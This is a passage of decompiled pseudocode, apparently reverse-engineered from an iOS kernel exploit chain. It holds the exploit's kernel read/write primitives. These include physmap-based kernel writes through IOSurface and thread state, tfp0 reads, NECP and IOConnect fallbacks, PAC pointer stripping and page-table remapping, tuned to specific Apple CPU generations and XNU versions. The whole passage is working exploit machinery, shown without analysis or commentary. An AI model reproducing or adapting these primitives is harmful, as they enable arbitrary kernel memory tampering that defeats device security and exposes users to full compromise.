              (unsigned long long)IOKitConnInfo,
              krwCtx->flags,
              *(unsigned __int8 *)(IOKitConnInfo + 74),
              krwCtx->threadForKernelRead,
              (unsigned long long)*(uint64_t *)&krwCtx->threadStateKrwPhysAddr);
  v8 = a4;
  if ( ((a2 & 3) != 0 || a4 != 4) && *(uint8_t *)(IOKitConnInfo + 74) )
  {
    if ( krwCtx->threadForKernelRead + 1 >= 2 )
    {
      if ( *(uint64_t *)&krwCtx->threadStateKrwPhysAddr )
      {
        if ( check_kaddr_in_physmap(krwCtx, a2) )
        {
          LODWORD(address) = -1;
          if ( !a5 || (v5 = fd_open_dev_null((int *)&address), !(uint32_t)v5) )
          {
            if ( v8 )
            {
              v12 = 0;
              while ( 1 )
              {
                v70 = 0;
                v13 = a2 + v12;
                v14 = v13 & 7;
                v15 = v13 - v14;
                v16 = kreadbuf_via_dev_null_and_thread_state(krwCtx, v13 - v14, (__int64)&v70, 8u, 0);
                if ( (uint32_t)v16 )
                {
                  TRACE_PORTS("iosurface_physmap_kwrite unaligned read failed raw=%x aligned=%llx off=%llx\n",
                              (unsigned int)v16,
                              (unsigned long long)v15,
                              (unsigned long long)v14);
                  break;
                }
                v17 = 8 - v14 >= (unsigned __int64)(v8 - v12) ? v8 - v12 : 8 - v14;
                v18 = v70;
                memcpy((void *)((unsigned __int64)&v70 | v14), (const void *)(a3 + v12), v17);
                if ( v18 != v70 )
                {
                  v16 = ioconnect_struct_method_kwrite(krwCtx, v15, v70);
                  if ( (uint32_t)v16 )
                  {
                    TRACE_PORTS("iosurface_physmap_kwrite unaligned write failed raw=%x aligned=%llx value=%llx\n",
                                (unsigned int)v16,
                                (unsigned long long)v15,
                                (unsigned long long)v70);
                    break;
                  }
                }
                v12 = v12 - v14 + 8;
                if ( v12 >= v8 )
                  goto LABEL_19;
              }
              v5 = v16;
            }
            else
            {
LABEL_19:
              v5 = 0;
            }
            v54 = address;
            goto LABEL_100;
          }
        }
      }
    }
    return v5;
  }
  if ( !check_kaddr_in_physmap(krwCtx, a2) )
  {
    TRACE_PORTS("iosurface_physmap_kwrite validate failed addr=%llx\n", (unsigned long long)a2);
    return v5;
  }
  v64 = -1;
  if ( a5 )
  {
    v5 = fd_open_dev_null(&v64);
    if ( (uint32_t)v5 )
      return v5;
  }
  if ( !v8 )
    goto LABEL_97;
  v61 = a2;
  v19 = 0;
  v59 = v8;
  v58 = a3;
LABEL_25:
  v20 = v8 - v19;
  v63 = 0;
  v21 = v61 + v19;
  if ( (unsigned int)v20 >= 4 )
  {
    v23 = 0;
    v22 = v19;
  }
  else
  {
    v22 = v19;
    if ( (((v21 + (unsigned int)v20 - 1) ^ (v21 + 3)) & ~krwCtx->pageMask) != 0 )
      v23 = 4 - v20;
    else
      v23 = 0;
  }
  v24 = v21 - v23;
  v25 = kreadbuf_via_dev_null_and_thread_state(krwCtx, v24, (__int64)&v63, 4u, 0);
  if ( !(uint32_t)v25 )
  {
    if ( 4 - (unsigned __int64)v23 >= v20 )
      v26 = v8 - v19;
    else
      v26 = 4LL - v23;
    v27 = v63;
    memcpy((char *)&v63 + v23, (const void *)(a3 + v22), v26);
    v28 = v63;
    v62 = v23;
    if ( v27 == v63 )
      goto LABEL_72;
    TRACE_PORTS("iosurface_physmap_kwrite aligned chunk addr=%llx base=%llx old=%x new=%x off=%u left=%llu\n",
                (unsigned long long)v21,
                (unsigned long long)v24,
                v27,
                v63,
                v23,
                (unsigned long long)v20);
    v70 = v24;
    address = 0;
    v29 = vm_page_size;
    if ( krw_ctx_has_flag(krwCtx, KRW_CTX_FLAG_CPU_A17) )
    {
      v30 = 224;
    }
    else if ( krw_ctx_has_flag(krwCtx, KRW_CTX_FLAG_CPU_A11_TO_A17_OR_SELF_TASK_PORT_MASK) )
    {
      v30 = 144;
    }
    else
    {
      v30 = 216;
    }
    v31 = krwCtx->IOKitConnInfo;
    v5 = 708609;
    if ( !v31 )
    {
      TRACE_PORTS("iosurface_physmap_kwrite missing IOKitConnInfo during chunk\n");
      goto LABEL_66;
    }
    v32 = *(uint32_t *)(v31 + 56);
    v5 = 708609;
    if ( !v32 )
    {
      TRACE_PORTS("iosurface_physmap_kwrite missing state[56]\n");
      goto LABEL_66;
    }
    v33 = *(uint64_t *)(v31 + 8);
    v5 = 708609;
    if ( !v33 )
    {
      TRACE_PORTS("iosurface_physmap_kwrite missing state[8]\n");
      goto LABEL_66;
    }
    v34 = (unsigned int)(v32 + 96);
    v35 = *(uint64_t *)(v31 + 32);
    v60 = v33 + v34;
    v56 = v29;
    v57 = v33 + v30;
    v36 = (__int64 *)(v35 + v34);
    v37 = 11;
    while ( 1 )
    {
      if ( v37 != 11 )
        thread_switch(*(uint32_t *)(v31 + 48), 2, 0xAu);
      if ( krwCtx->xnuVersionPacked > XNU_VERSION_PACKED(10002, 60, 75, 0, 2) && (krwCtx->flags & KRW_CTX_FLAG_PAC_KERNEL_LAYOUT) != 0 )
      {
        v68 = 0;
        v39 = read_via_mapped_physmem_region(krwCtx, v60, &v68, krwCtx->stride_0x168, 0);
        if ( (uint32_t)v39 )
          goto LABEL_64;
        if ( !validate_kaddr_range(krwCtx, v68) )
          goto LABEL_55;
        v67 = 0;
        v39 = read_via_mapped_physmem_region(krwCtx, v57, &v67, krwCtx->stride_0x168, 0);
        if ( (uint32_t)v39 )
        {
LABEL_64:
          v5 = v39;
          goto LABEL_65;
        }
        v38 = v67;
      }
      else
      {
        v68 = *v36;
        if ( !validate_kaddr_range(krwCtx, v68) )
          goto LABEL_55;
        v38 = *(uint64_t *)(v35 + v30);
        v67 = v38;
      }
      if ( v38 == v68 )
      {
        paddr = find_sptm_pgtable_state_block(krwCtx, v38, 0);
        v29 = v56;
        if ( !paddr )
        {
          v5 = 163878;
          goto LABEL_66;
        }
        v41 = paddr;
        if ( krwCtx->xnuVersionPacked > XNU_VERSION_PACKED(10002, 60, 75, 0, 2) && (krwCtx->flags & KRW_CTX_FLAG_PAC_KERNEL_LAYOUT) != 0 )
        {
          v45 = read_via_mapped_physmem_region(krwCtx, paddr + 52, &v65, 4u, 0);
          v5 = v45;
          if ( (uint32_t)v45 )
            goto LABEL_66;
          v5 = 163857;
          if ( v65 != 1 )
            goto LABEL_66;
          if ( v28 )
          {
            v65 = v28 + 1;
            v46 = physwritebuf_direct_mapped(krwCtx, v41 + 52, &v65, 4u, 0);
            v5 = v46;
            if ( (uint32_t)v46 )
              goto LABEL_66;
            v47 = 1;
          }
          else
          {
            v47 = 2;
          }
          v66 = v47;
          v52 = physwritebuf_direct_mapped(krwCtx, v41 + 56, &v66, 4u, 0);
          v5 = v52;
          if ( !(uint32_t)v52 )
          {
            v53 = physwritebuf_direct_mapped(krwCtx, v60 + 24, &v70, krwCtx->stride_0x168, 0);
            v5 = v53;
            if ( !(uint32_t)v53 )
            {
LABEL_82:
              v48 = *(uint64_t *)(v31 + 64);
              if ( (unsigned int)__ulock_wake(0x201u, (void *)(v31 + 52), *(unsigned int *)(v31 + 48)) )
              {
                v49 = errno;
                if ( v49 < 0 )
                  v49 = -v49;
                v5 = v49 | 0x40000000u;
              }
              else if ( v48 == *(uint64_t *)(v31 + 64) )
              {
                v50 = 0;
                while ( v50 != 1001 )
                {
                  v51 = v50 + 1;
                  thread_switch(*(uint32_t *)(v31 + 48), 2, v50 > 8);
                  v5 = 0;
                  v50 = v51;
                  v29 = v56;
                  if ( v48 != *(uint64_t *)(v31 + 64) )
                    goto LABEL_66;
                }
                v5 = 4097;
              }
              else
              {
                v5 = 0;
              }
            }
          }
        }
        else
        {
          v5 = physmap_maybe(krwCtx, &address, v56, paddr);
          if ( !(uint32_t)v5 )
          {
            v42 = (krwCtx->pageMask & v68) + address;
            v65 = *(uint32_t *)(v42 + 52);
            v5 = 163857;
            if ( v65 == 1 )
            {
              if ( v28 )
              {
                *(uint32_t *)(v42 + 52) = v28 + 1;
                v43 = 1;
              }
              else
              {
                v43 = 2;
              }
              v66 = v43;
              *(uint32_t *)(v42 + 56) = v43;
              v36[3] = v24;
              goto LABEL_82;
            }
          }
        }
LABEL_66:
        TRACE_PORTS("iosurface_physmap_kwrite chunk cleanup err=%llx addr=%llx physmap=%llx\n",
                    (unsigned long long)v5,
                    (unsigned long long)v24,
                    (unsigned long long)address);
        if ( address )
          v44 = v29 == 0;
        else
          v44 = 1;
        if ( !v44 )
          vm_deallocate(mach_task_self_, address, v29);
        v8 = v59;
        a3 = v58;
        if ( (uint32_t)v5 )
          goto LABEL_99;
LABEL_72:
        v19 = v19 - v62 + 4;
        if ( v19 >= v8 )
        {
LABEL_97:
          v5 = 0;
          goto LABEL_99;
        }
        goto LABEL_25;
      }
LABEL_55:
      if ( !--v37 )
      {
        v5 = 163878;
LABEL_65:
        v29 = v56;
        goto LABEL_66;
      }
    }
  }
  v5 = v25;
  TRACE_PORTS("iosurface_physmap_kwrite pre-read failed raw=%llx addr=%llx base=%llx\n",
              (unsigned long long)v5,
              (unsigned long long)v21,
              (unsigned long long)v24);
LABEL_99:
  v54 = v64;
LABEL_100:
  if ( v54 != -1 )
    fd_close(v54);
  TRACE_PORTS("iosurface_physmap_kwrite exit raw=%llx\n", (unsigned long long)v5);
  return v5;
}
// 292C0: variable 'v39' is possibly undefined
// 2942C: variable 'v45' is possibly undefined
// 2946C: variable 'v46' is possibly undefined
// 29530: variable 'v52' is possibly undefined
// 29554: variable 'v53' is possibly undefined

//----- (00000000000295B4) ----------------------------------------------------
bool __fastcall kread_u32(struct_krwCtx *krwCtx, unsigned __int64 vaddr, void *outBuf)
{
  // struct_krwCtx *krwCtx; // x19
  __int64 (__fastcall *v3)(__int64, unsigned __int64, void *, unsigned int, __int64); // x8
  int v4; // w0
  int v5; // w0
  __int64 v7; // [xsp+8h] [xbp-8h] BYREF

  krwCtx = KRWCTX_FROM_UINTPTR(krwCtx);
  v3 = (__int64 (__fastcall *)(__int64, unsigned __int64, void *, unsigned int, __int64))krwCtx->iogpuKreadFn;
  if ( v3 )
  {
    v4 = v3(krwCtx, vaddr, outBuf, 4, 1);
    goto LABEL_3;
  }
  if ( (unsigned int)(krwCtx->threadForKernelRead + 1) >= 2 && krwCtx->threadStateKrwPhysAddr )
  {
    v4 = kreadbuf_via_dev_null_and_thread_state(krwCtx, vaddr, (__int64)outBuf, 4u, 1);
  }
  else if ( (unsigned int)(krwCtx->ioConnectPort + 1) >= 2 && krwCtx->ioConnectMappedAddr && krwCtx->ioConnectMappedSize )
  {
    v4 = kreadbuf_via_IOConnectCallMethod(krwCtx, vaddr, (__int64)outBuf, 4u, 1);
  }
  else
  {
    if ( krwCtx->krw_pipe_0 == -1 || krwCtx->krw_pipe_1 == -1 )
      goto LABEL_22;
    if ( krwCtx->iosurfaceFd != -1 && krwCtx->gap_0x218 )
    {
      v4 = kreadbuf_via_dev_null_only(krwCtx, vaddr, (__int64)outBuf, 4u, 1);
      goto LABEL_3;
    }
    if ( krwCtx->pipeFd0 == -1 || krwCtx->pipeFd1 == -1 )
    {
LABEL_22:
      v5 = kreadbuf_via_tfp0(
             krwCtx->targetVmPort,
             vaddr,
             4u,
             krwCtx->vmMapSize,
             (__int64)outBuf,
             &v7);
      return v5 == 0;
    }
    v4 = kreadbuf_via_dev_null_simple(krwCtx, vaddr, outBuf, 4u, 1);
  }
LABEL_3:
  if ( v4 )
    v5 = 5;
  else
    v5 = 0;
  return v5 == 0;
}

//----- (00000000000296E8) ----------------------------------------------------
__int64 __fastcall kreadbuf_via_dev_null_and_thread_state(
        struct_krwCtx *krwCtx,
        unsigned __int64 vaddr,
        __int64 outBuf,
        unsigned int size,
        int a5)
{
  __int64 v5; // x28
  unsigned __int64 vaddr_; // x22
  unsigned int iMaybe; // w8
  unsigned __int32 sizeMinusI; // w19
  __int64 iPtr; // x26
  unsigned __int64 xnuVersionPacked; // x8
  int v16; // w9
  unsigned __int32 v17; // w8
  unsigned __int32 v18[2]; // x24
  unsigned __int64 v19; // x20
  __int64 v20; // x8
  size_t offIGuess; // x26
  unsigned __int64 v22; // x21
  void *outBufWithOffAndOff; // x27
  unsigned __int64 v24; // x22
  uint64_t v25; // x8
  __int64 v26; // x9
  unsigned __int64 v27; // x8
  unsigned __int64 v28; // x19
  __int64 v29; // x25
  kern_return_t v30; // w0
  uint64_t pageMask; // x25
  __int64 v32; // x19
  __int64 v33; // x25
  __int64 v34; // x0
  kern_return_t state; // w0
  unsigned int v36; // w19
  __int64 v37; // x0
  unsigned int v38; // w0
  unsigned int v39; // w8
  unsigned __int64 vaddr__; // [xsp+8h] [xbp-2B8h]
  __int64 outBuf_; // [xsp+10h] [xbp-2B0h]
  unsigned int size_; // [xsp+1Ch] [xbp-2A4h]
  int v43; // [xsp+20h] [xbp-2A0h]
  __int64 outBufWithOff; // [xsp+28h] [xbp-298h]
  __int64 vaddrPlusI; // [xsp+30h] [xbp-290h]
  int fd; // [xsp+38h] [xbp-288h] BYREF
  mach_msg_type_number_t v47; // [xsp+3Ch] [xbp-284h] BYREF
  natural_t old_state[134]; // [xsp+40h] [xbp-280h] BYREF
  __int64 v49; // [xsp+258h] [xbp-68h] BYREF
  mach_msg_type_number_t old_stateCnt[4]; // [xsp+260h] [xbp-60h] BYREF

  v5 = 0xAD001;
  if ( krwCtx->threadForKernelRead + 1 >= 2 )
  {
    if ( *(uint64_t *)&krwCtx->threadStateKrwPhysAddr )
    {
      vaddr_ = vaddr;
      if ( check_kaddr_in_physmap(krwCtx, vaddr) )
      {
        fd = -1;
        if ( !a5 || (v5 = fd_open_dev_null(&fd), !(uint32_t)v5) )
        {
          if ( size )
          {
            iMaybe = 0;
            size_ = size;
            vaddr__ = vaddr_;
            outBuf_ = outBuf;
            while ( 1 )
            {
              sizeMinusI = size - iMaybe;
              iPtr = iMaybe;
              vaddrPlusI = vaddr_ + iMaybe;
              if ( (krwCtx->pageMask & vaddrPlusI) == 0 && sizeMinusI >= 0x4000 && krw_ctx_has_read_caps(krwCtx) )
              {
                xnuVersionPacked = krwCtx->xnuVersionPacked;
                if ( xnuVersionPacked <= XNU_VERSION_PACKED(8019, 60, 39, 1023, 1023) )
                  v16 = 0x4000;
                else
                  v16 = 0x80000;
                if ( xnuVersionPacked <= XNU_VERSION_PACKED(10001, 1023, 1023, 1023, 1023) )
                  v17 = v16;
                else
                  v17 = 528;
                if ( sizeMinusI >= v17 )
                  v18[0] = v17;
                else
                  v18[0] = sizeMinusI;
                v5 = necp_semaphore_kread(krwCtx, vaddrPlusI, (char *)(outBuf + iPtr), v18[0]);
LABEL_68:
                if ( (uint32_t)v5 )
                  goto LABEL_72;
                goto LABEL_69;
              }
              if ( sizeMinusI >= 0x210 )
                *(uint64_t *)v18 = 528;
              else
                *(uint64_t *)v18 = sizeMinusI;
              if ( krwCtx->threadForKernelRead + 1 < 2 || !*(uint64_t *)&krwCtx->threadStateKrwPhysAddr )
              {
                v5 = 708609;
                goto LABEL_72;
              }
              if ( v18[0] )
                break;
LABEL_69:
              iMaybe = v18[0] + iPtr;
              if ( v18[0] + (unsigned int)iPtr >= size )
                goto LABEL_70;
            }
            v19 = 0;
            v20 = iPtr;
            offIGuess = 0;
            v43 = v20;
            outBufWithOff = outBuf + v20;
            while ( 1 )
            {
              v22 = v19 + vaddrPlusI;
              outBufWithOffAndOff = (void *)(v19 + outBufWithOff);
              v24 = *(uint64_t *)v18 - v19;
              if ( krwCtx->xnuVersionPacked >= XNU_VERSION_PACKED(10002, 60, 75, 0, 3) && (krwCtx->flags & KRW_CTX_FLAG_PAC_KERNEL_LAYOUT) != 0 )
              {
                *(uint64_t *)old_stateCnt = 0;
                v47 = 132;
                pageMask = krwCtx->pageMask;
                if ( (pageMask & v22) >= (unsigned __int64)(unsigned int)krwCtx->pageSizeOrSomething - 528 )
                  v32 = (unsigned int)krwCtx->pageSizeOrSomething - 528LL;
                else
                  v32 = pageMask & v22;
                if ( validate_kaddr_range(krwCtx, *(uint64_t *)&krwCtx->threadStateSavedPtr) )
                {
                  *(uint64_t *)old_stateCnt = *(uint64_t *)&krwCtx->threadStateSavedPtr;
                  goto LABEL_45;
                }
                v37 = read_via_mapped_physmem_region(krwCtx, *(uint64_t *)&krwCtx->threadStateKrwPhysAddr, old_stateCnt, 8u, 0);
                v5 = v37;
                if ( !(uint32_t)v37 )
                {
                  *(uint64_t *)&krwCtx->threadStateSavedPtr = *(uint64_t *)old_stateCnt;
LABEL_45:
                  v33 = v32 + (v22 & ~pageMask);
                  __dsb(0xBu);
                  v49 = v33 - 16;
                  v34 = physwritebuf_direct_mapped(krwCtx, *(uint64_t *)&krwCtx->threadStateKrwPhysAddr, &v49, 8u, 0);
                  v5 = v34;
                  if ( !(uint32_t)v34 )
                  {
                    state = thread_get_state(krwCtx->threadForKernelRead, 0x11, old_state, &v47);
                    if ( state )
                    {
                      v36 = state | 0x80000000;
                    }
                    else if ( v47 == 132 )
                    {
                      if ( v33 - v22 + 528 <= v24 )
                        offIGuess = v33 - v22 + 528;
                      else
                        offIGuess = *(uint64_t *)v18 - v19;
                      memcpy(outBufWithOffAndOff, (char *)old_state + v22 - v33, offIGuess);
                      v36 = 0;
                    }
                    else
                    {
                      v36 = 708642;
                    }
                    v38 = physwritebuf_direct_mapped(krwCtx, *(uint64_t *)&krwCtx->threadStateKrwPhysAddr, old_stateCnt, 8u, 0);
                    if ( v36 )
                      v39 = v36;
                    else
                      v39 = v38;
                    if ( v38 )
                      v5 = v39;
                    else
                      v5 = v36;
                  }
                }
              }
              else
              {
                old_stateCnt[0] = 132;
                v25 = krwCtx->pageMask;
                v26 = v22 & ~v25;
                v27 = v25 & v22;
                if ( v27 >= (unsigned __int64)(unsigned int)krwCtx->pageSizeOrSomething - 528 )
                  v27 = (unsigned int)krwCtx->pageSizeOrSomething - 528LL;
                v28 = v27 + v26;
                v29 = **(uint64_t **)&krwCtx->threadStateMappedPtr;
                __dsb(0xBu);
                **(uint64_t **)&krwCtx->threadStateMappedPtr = v27 + v26 - 16;
                v30 = thread_get_state(krwCtx->threadForKernelRead, 17, old_state, old_stateCnt);
                if ( v30 )
                {
                  v5 = v30 | 0x80000000;
                }
                else if ( old_stateCnt[0] == 132 )
                {
                  if ( v28 - v22 + 528 <= v24 )
                    offIGuess = v28 - v22 + 528;
                  else
                    offIGuess = *(uint64_t *)v18 - v19;
                  memcpy(outBufWithOffAndOff, (char *)old_state + v22 - v28, offIGuess);
                  v5 = 0;
                }
                else
                {
                  v5 = 708642;
                }
                **(uint64_t **)&krwCtx->threadStateMappedPtr = v29;
              }
              if ( !(uint32_t)v5 )
              {
                v19 += offIGuess;
                if ( v19 < *(uint64_t *)v18 )
                  continue;
              }
              size = size_;
              vaddr_ = vaddr__;
              outBuf = outBuf_;
              LODWORD(iPtr) = v43;
              goto LABEL_68;
            }
          }
LABEL_70:
          v5 = 0;
LABEL_72:
          if ( fd != -1 )
            fd_close(fd);
        }
      }
    }
  }
  return v5;
}
// 2999C: variable 'v34' is possibly undefined
// 29A04: variable 'v37' is possibly undefined
// 29A7C: variable 'v38' is possibly undefined

//----- (0000000000029AD0) ----------------------------------------------------
__int64 __fastcall kreadbuf_via_tfp0(
        vm_map_read_t target_task,
        __int64 vaddr,
        mach_vm_size_t size,
        mach_vm_size_t size2,
        __int64 outBuf,
        uint64_t *a6)
{
  mach_vm_size_t v8; // x21
  __int64 baseAddr; // x24
  mach_vm_size_t v12; // x25
  mach_vm_size_t v13; // x2
  __int64 result; // x0
  mach_vm_size_t outsize; // [xsp+8h] [xbp-48h] BYREF

  if ( !size )
    return 4;
  v8 = size;
  baseAddr = 0;
  if ( size2 )
    v12 = size2;
  else
    v12 = size;
  while ( 1 )
  {
    outsize = v8;
    v13 = v8 >= v12 ? v12 : v8;
    result = mach_vm_read_overwrite(target_task, baseAddr + vaddr, v13, baseAddr + outBuf, &outsize);
    if ( (uint32_t)result )
      break;
    baseAddr = (unsigned int)(outsize + baseAddr);
    v8 -= outsize;
    if ( !v8 )
    {
      result = 0;
      if ( a6 )
        *a6 = baseAddr;
      return result;
    }
  }
  return result;
}

//----- (0000000000029B78) ----------------------------------------------------
bool __fastcall kread64_internal(struct_krwCtx *krwCtx, unsigned __int64 a2, uint64_t *a3)
{
  __int64 (__fastcall *v3)(struct_krwCtx *, unsigned __int64, uint64_t *, uint64_t, __int64); // x8
  int v4; // w0
  int v5; // w0
  __int64 v7; // [xsp+8h] [xbp-8h] BYREF

  *a3 = 0;
  v3 = *(__int64 (__fastcall **)(struct_krwCtx *, unsigned __int64, uint64_t *, uint64_t, __int64))&krwCtx->iogpuKreadFn;
  if ( v3 )
  {
    v4 = v3(krwCtx, a2, a3, (unsigned int)krwCtx->stride_0x168, 1);
    goto LABEL_3;
  }
  if ( krwCtx->threadForKernelRead + 1 >= 2 && *(uint64_t *)&krwCtx->threadStateKrwPhysAddr )
  {
    v4 = kreadbuf_via_dev_null_and_thread_state(krwCtx, a2, (__int64)a3, krwCtx->stride_0x168, 1);
  }
  else if ( (unsigned int)(*(uint32_t *)&krwCtx->ioConnectPort + 1) >= 2 && *(uint64_t *)&krwCtx->ioConnectMappedAddr && *(uint64_t *)&krwCtx->ioConnectMappedSize )
  {
    v4 = kreadbuf_via_IOConnectCallMethod(krwCtx, a2, (__int64)a3, krwCtx->stride_0x168, 1);
  }
  else
  {
    if ( krwCtx->krw_pipe_0 == -1 || krwCtx->krw_pipe_1 == -1 )
      goto LABEL_22;
    if ( krwCtx->iosurfaceFd != -1 && krwCtx->gap_0x218 )
    {
      v4 = kreadbuf_via_dev_null_only(krwCtx, a2, (__int64)a3, krwCtx->stride_0x168, 1);
      goto LABEL_3;
    }
    if ( krwCtx->pipeFd0 == -1 || krwCtx->pipeFd1 == -1 )
    {
LABEL_22:
      v5 = kreadbuf_via_tfp0(krwCtx->targetAndParentTaskPorts, a2, krwCtx->stride_0x168, (unsigned int)krwCtx->vmMapSize, (__int64)a3, &v7);
      return v5 == 0;
    }
    v4 = kreadbuf_via_dev_null_simple(krwCtx, a2, a3, krwCtx->stride_0x168, 1);
  }
LABEL_3:
  if ( v4 )
    v5 = 5;
  else
    v5 = 0;
  return v5 == 0;
}

//----- (0000000000029CB0) ----------------------------------------------------
unsigned __int64 __fastcall maybe_sptm_translate_kaddr(struct_krwCtx *krwCtx, __int64 a2)
{

  if ( !krw_ctx_has_flag(krwCtx, KRW_CTX_FLAG_CPU_A12_TO_A17_OR_SELF_TASK_PORT_MASK) || (krwCtx->flags & KRW_CTX_FLAG_CPU_A12_TO_A17_OR_SELF_TASK_PORT_MASK) == 0 )
    return a2;
  return krw_xpac_vaddr(krwCtx, a2);
}
// 29D08: variable 'vars8' is possibly undefined

//----- (0000000000029D2C) ----------------------------------------------------
unsigned __int64 __fastcall krw_xpac_vaddr_if_needed(struct_krwCtx *krwCtx, __int64 a2)
{

  if ( !krw_ctx_has_flag(krwCtx, KRW_CTX_FLAG_CPU_A12_TO_A17_OR_SELF_TASK_PORT_MASK) )
    return a2;
  return krw_xpac_vaddr(krwCtx, a2);
}
// 29D68: variable 'vars8' is possibly undefined

//----- (0000000000029D88) ----------------------------------------------------
unsigned __int64 __fastcall krw_xpac_vaddr(struct_krwCtx *krwCtx, __int64 a2)
{
  __int64 v2; // x19

  v2 = a2;
  if ( a2 && (a2 & 0x80000000000000LL) != 0 )
  {
    if ( krw_ctx_has_flag(krwCtx, KRW_CTX_FLAG_CPU_HIGH_CORE_CLUSTER)
      || (krw_ctx_has_flag(krwCtx, KRW_CTX_FLAG_CPU_A16_A17_MASK)
       && krwCtx->xnuVersionPacked >= XNU_VERSION_PACKED(8792, 40, 108, 0, 0)) )
      return v2 | 0xFFFF800000000000LL;
    else
      return v2 | 0xFFFFFF8000000000LL;
  }
  return v2;
}

//----- (0000000000029DF8) ----------------------------------------------------
bool __fastcall this_is_the_kwrite64(struct_krwCtx *krwCtx, mach_vm_address_t address, __int64 newValue, int whatIsThis)
{
  // struct_krwCtx *krwCtx; // x19
  __int64 (__fastcall *v6)(__int64, mach_vm_address_t, __int64 *, uint64_t, __int64); // x8
  int v7; // w0
  kern_return_t v8; // w21
  __int64 v10; // x23
  semaphore_t v11; // w0
  int v12; // w21
  vm_map_t v13; // w0
  mach_vm_size_t v14; // x2
  __int64 v16; // x9
  int v17; // w8
  uint64_t *v18; // x20
  kern_return_t v19; // w0
  mach_timespec_t v20; // x1
  kern_return_t v21; // w0
  __int64 v22; // [xsp+8h] [xbp-48h] BYREF
  __int64 v23; // [xsp+10h] [xbp-40h] BYREF
  vm_machine_attribute_val_t value[2]; // [xsp+18h] [xbp-38h] BYREF

  v22 = newValue;
  v6 = (__int64 (__fastcall *)(__int64, mach_vm_address_t, __int64 *, uint64_t, __int64))krwCtx->iogpuKwriteFn;
  if ( v6 )
  {
    v7 = v6(krwCtx, address, &v22, krwCtx->stride_0x168, 1);
    goto LABEL_3;
  }
  if ( (unsigned int)(krwCtx->threadForKernelRead + 1) >= 2 && krwCtx->threadStateKrwPhysAddr )
  {
    *(uint64_t *)value = newValue;
    if ( !krwCtx->IOKitConnInfo )
    {
      v8 = 5;
      return v8 == 0;
    }
    v7 = iosurface_physmap_kwrite(krwCtx, address, (__int64)value, krwCtx->stride_0x168, 1);
    goto LABEL_3;
  }
  if ( (unsigned int)(krwCtx->ioConnectPort + 1) >= 2 && krwCtx->ioConnectMappedAddr && krwCtx->ioConnectMappedSize )
  {
    v7 = ioconnect_callmethod_write(krwCtx, address, (__int64)&v22, krwCtx->stride_0x168, 1);
    goto LABEL_3;
  }
  if ( krwCtx->krw_pipe_0 == -1 || krwCtx->krw_pipe_1 == -1 )
    goto LABEL_27;
  if ( krwCtx->iosurfaceFd_size4 == -1 || !krwCtx->gap_0x218 )
  {
    if ( krwCtx->pipeFd0 != -1 && krwCtx->pipeFd1 != -1 )
    {
      v7 = pipe_pair_krw(krwCtx, address, &v22, krwCtx->stride_0x168, 1);
      goto LABEL_3;
    }
LABEL_27:
    v8 = mach_vm_write(krwCtx->targetVmPort, address, (vm_offset_t)&v22, krwCtx->stride_0x168);
    v13 = krwCtx->targetVmPort;
    v14 = krwCtx->stride_0x168;
    value[0] = 7;
    mach_vm_machine_attribute(v13, address, v14, 1u, value);
    return v8 == 0;
  }
  v23 = newValue;
  if ( whatIsThis )
  {
    v7 = acquire_write_semaphore_lock(krwCtx, 1u, 0x2710u);
    if ( v7 )
      goto LABEL_3;
    if ( krwCtx->xnuVersionPacked < XNU_VERSION_PACKED(8019, 0, 0, 0, 0) )
    {
      v12 = necp_ioservice_auth_write(krwCtx, address);
      goto LABEL_32;
    }
    *(uint64_t *)value = newValue;
    v10 = krwCtx->semaphoreHelperCtx;
    if ( !v10 || (v11 = *(uint32_t *)(v10 + 8), v11 + 1 < 2) )
    {
      v12 = 708609;
      goto LABEL_32;
    }
    v12 = 708609;
    if ( (unsigned int)(*(uint32_t *)(v10 + 12) + 1) >= 2 )
    {
      *(uint64_t *)(v10 + 32) = address;
      v18 = (uint64_t *)(v10 + 32);
      *(uint64_t *)(v10 + 40) = value;
      *(uint64_t *)(v10 + 48) = 8;
      v19 = semaphore_signal(v11);
      if ( v19 )
      {
        v12 = v19 | 0x80000000;
LABEL_41:
        *v18 = 0;
        *(uint64_t *)(v10 + 40) = 0;
        *(uint64_t *)(v10 + 48) = 0;
        goto LABEL_32;
      }
      v20 = IDA_MACH_TIMESPEC(3ULL);
      v21 = semaphore_timedwait(*(uint32_t *)(v10 + 12), v20);
      v12 = *(uint32_t *)(v10 + 60);
      if ( !v12 )
      {
        if ( v21 )
          v12 = v21 | 0x80000000;
        else
          v12 = 0;
        goto LABEL_41;
      }
      *v18 = 0;
      *(uint64_t *)(v10 + 40) = 0;
      *(uint64_t *)(v10 + 48) = 0;
      teardown_semaphore_helper_ctx(krwCtx, 0);
    }
LABEL_32:
    v16 = krwCtx->mappedKernelRegion;
    v17 = 708616;
    if ( v16 && krwCtx->mappedKernelSize )
    {
      v17 = 0;
      atomic_store(0, (unsigned __int8 *)(v16 + 1));
    }
    if ( v12 )
      v7 = v12;
    else
      v7 = v17;
    goto LABEL_3;
  }
  v7 = necp_ioconnect_krw(krwCtx, address, (__int64)&v23, krwCtx->stride_0x168, 1);
LABEL_3:
  if ( v7 )
    v8 = 5;
  else
    v8 = 0;
  return v8 == 0;
}

//----- (000000000002A0D0) ----------------------------------------------------
bool __fastcall kwrite64(struct_krwCtx *krwCtx, mach_vm_address_t a2, __int64 a3)
{
  return kwrite64_last_arg(krwCtx, a2, a3, krwCtx->gap_0xC);
}

//----- (000000000002A0D8) ----------------------------------------------------
__int64 __fastcall pgtable_walk_and_physmap_remap(struct_krwCtx *krwCtx, __int64 a2, __int64 a3)
{
  int v6; // w0
  int v7; // w0
  __int64 v8; // x8
  __int64 v9; // x20
  uint8_t v11[32]; // [xsp+8h] [xbp-88h] BYREF
  __int64 v12; // [xsp+28h] [xbp-68h]
  __int128 v13[3]; // [xsp+30h] [xbp-60h] BYREF
  __int64 v14; // [xsp+60h] [xbp-30h]

  v12 = 0;
  v14 = 0;
  memset(v13, 0, sizeof(v13));
  v6 = pgtable_walk_wrapper(krwCtx, a2 & ~krwCtx->pageMask, v11);
  if ( !v6 )
    return 0;
  v7 = physmap_map_cached(krwCtx, v12 & 0xFFFFFFFFC000LL, (__int64)v13);
  v8 = *(uint64_t *)&v13[0];
  if ( v7 )
  {
    v9 = 0;
    if ( !*(uint64_t *)&v13[0] )
      return v9;
    goto LABEL_7;
  }
  *(uint64_t *)((krwCtx->pageMask & a2) + *(uint64_t *)&v13[0]) = a3;
  v9 = 1;
  if ( v8 )
LABEL_7:
    physmap_unmap_cached(krwCtx, (__int64)v13);
  return v9;
}
// 2A11C: variable 'v6' is possibly undefined

//----- (000000000002A188) ----------------------------------------------------
